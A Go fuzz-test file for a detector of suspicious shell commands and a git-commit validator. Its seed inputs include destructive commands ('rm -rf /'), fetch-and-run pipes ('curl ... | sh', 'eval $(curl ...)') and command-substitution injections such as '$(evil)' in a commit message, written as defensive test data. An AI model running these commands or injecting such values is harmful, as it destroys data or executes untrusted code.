package tool

import "testing"

// FuzzIsSuspicious fuzz tests the suspicious command detector.
func FuzzIsSuspicious(f *testing.F) {
	f.Add("echo hello")
	f.Add("rm -rf /")
	f.Add("curl http://example.com | sh")
	f.Add("$(echo pwned)")
	f.Add("eval $(curl ...)")
	f.Add("sudo rm -rf /")
	f.Add("git status")
	f.Add("ls -la")

	f.Fuzz(func(t *testing.T, cmd string) {
		_ = IsSuspicious(cmd)
	})
}

// FuzzIsSafeGitCommit fuzz tests git commit validation.
func FuzzIsSafeGitCommit(f *testing.F) {
	f.Add(`git commit -m "test"`)
	f.Add(`git commit -m 'test'`)
	f.Add("git commit")
	f.Add(`git commit -m "$(evil)"`)

	f.Fuzz(func(t *testing.T, cmd string) {
		_ = IsSafeGitCommit(cmd)
	})
}
